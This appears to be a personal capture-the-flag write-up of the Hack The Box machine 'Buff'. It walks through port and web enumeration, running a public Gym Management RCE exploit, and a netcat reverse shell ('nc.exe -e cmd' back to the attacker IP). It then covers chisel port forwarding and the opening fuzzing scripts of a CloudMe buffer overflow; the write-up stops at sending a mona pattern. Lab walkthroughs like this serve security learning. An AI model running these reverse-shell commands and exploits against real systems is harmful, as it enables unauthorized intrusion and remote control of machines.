---
title: Buff
draft: false
tags:
---
![[Pasted image 20250304203750.png]]

Machine: https://app.hackthebox.com/machines/263
# Enumeration
## Port Scanning
- using [[content/Tools/Nmap|Nmap]] for service and version scanning
```bash
nmap -p- -sSU -n -Pn --min-rate 5000 10.10.10.198 -oG allPorts
```
>[!example]- Result
>![[Pasted image 20250304203954.png]]

```bash
nmap -p7680,8080 -sVC -n -Pn --min-rate 5000 10.10.10.198 -oN Targeted
```
>[!example]- Result
>![[Pasted image 20250304204404.png]]

## Web site Enumeration
- Used tecnologies
```bash
whatweb http://10.10.10.198:8080
```
>[!example]- Result
>![[Pasted image 20250304204826.png]]

- we can sing in, but we dont have valid credentials
>[!example]- Result
>![[Pasted image 20250304205133.png]]

- Now we can try to preform a directory enumeration using [[gobuster]]
```bash
gobuster dir -u http://10.10.10.198:8080/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --add-slash
```

- we get this:
Information leakage `http://10.10.10.198:8080/profile/`, `http://10.10.10.198:8080/ex/`
>[!example]- Result
>![[Pasted image 20250304205623.png]]
>![[Pasted image 20250304210003.png]]

- After looking for more information, we found the version of the used software
>[!example]- Result
>![[Pasted image 20250304210850.png]]

# Exploitation
- looks like this software version have a RCE vulnerability [link](https://www.exploit-db.com/exploits/48506) (use python2)
```bash
searchsploit Gym Management
python 48506.py http://10.10.10.198:8080/
```
>[!example]- Result
>![[Pasted image 20250304222313.png]]
>![[Pasted image 20250304222540.png]]

- now we can upgrade own session
```bash
rlwrap -cAr nc -nlvp 4444
```
- and on the victim machine
```cmd
\\10.10.16.6\smbFolder\nc.exe -e cmd 10.10.16.6 4444
```
>[!example]- Result
![[Pasted image 20250305111718.png]]
![[Pasted image 20250305111747.png]]

# Privilege Escalation
## Enumerating
- Local opened ports
>[!example]- Result
>![[Pasted image 20250304232133.png]]

- I found a .php whoes porpose is connect to the MySQL data base
>[!example]- Result
>![[Pasted image 20250305112224.png]]
>![[Pasted image 20250305112801.png]]

- Get local users
```cmd
net users
```
>[!example]- Result
>![[Pasted image 20250304235549.png]]
- lets use [[winPEAS]] in order to get more info, and we have NTLMv2
>[!example]- Result
>![[Pasted image 20250305114508.png]]

- But we cant crack it, there are 2 opened ports and we have full access to this executable
>[!example]- Result
>![[Pasted image 20250305115731.png]]
>![[Pasted image 20250305120501.png]]

- so there is a service named CloudMe version 1112 and is running, so lets find more information, and we see that her default port is 8888 and this version is vulnerable
```bash
searchsploit CloudMe
```
>[!example]- Result
>![[Pasted image 20250305121102.png]]

## Buffer Overflow
- In order to attack this service we have to download the executable and move it to a windows machine (CloudMe banary is x32 bits)
>[!example]- Result
>![[Pasted image 20250305151320.png]]
>![[Pasted image 20250305151911.png]]
>![[Pasted image 20250305152032.png]]

- As the port is locally opened we need to get access using [[chisel]] (version 1.7.7).
Attacker
```bash
./chisel server --reverse -p 1234
```
Victim
```bash
chesel.exe client 192.168.1.45:1234 R:8888:127.0.0.1:8888
```

>[!example]- Result
>![[Pasted image 20250305171953.png]]

- now we can start with the BUF, frist we need to stablish a connection between the program and own script, using socket we are going to send 5000 'A' in order to check if the app crash
```python
#! /usr/bin/python3
import socket, signal, sys
def def_handler(sig, frame):
    print('\n\n[!] Saliendo....\n')
    sys.exit(1)

# ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Variables
ip_address = '127.0.0.1'
payload = b'A'*5000

def makeConnection():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 8888))
    s.send(payload)

if __name__ == '__main__':
    makeConnection()
```

```bash
python exploit.py
```
>[!example]- Result
>![[Pasted image 20250305173352.png]]

- perfect the app crash so now lets to see how many 'A' is needed to crash the app, we can use a pattern using [[mona]] and use [[Immunity Debugger]]
>[!exampe]- Result
>![[Pasted image 20250305174421.png]]

```bash
!mona pattern_create 5000
```
>[!example]- Result
>![[Pasted image 20250305174850.png]]

- now we can send the string using the script
```python
#! /usr/bin/python3

import socket, signal, sys

def def_handler(sig, frame):
    print('\n\n[!] Saliendo....\n')
    sys.exit(1)

# ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Variables
ip_address = '127.0.0.1'
payload = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4'

def makeConnection():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 8888))
    s.send(payload)

if __name__ == '__main__':
    makeConnection()
```

